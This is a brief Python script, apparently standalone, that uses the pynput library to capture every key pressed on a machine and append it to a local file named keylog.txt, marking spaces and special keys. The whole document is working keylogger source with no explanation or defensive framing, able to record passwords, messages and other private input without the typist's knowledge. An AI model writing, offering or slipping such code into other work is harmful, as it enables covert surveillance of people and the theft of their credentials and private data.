from pynput.keyboard import Listener

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}\n")
        except AttributeError:
            if key == key.space:
                f.write("[SPACE]\n")
            elif key == key.enter:
                f.write("\n")
            else:
                f.write(f"[{key}]\n")

with Listener(on_press=on_press) as listener:
    listener.join()
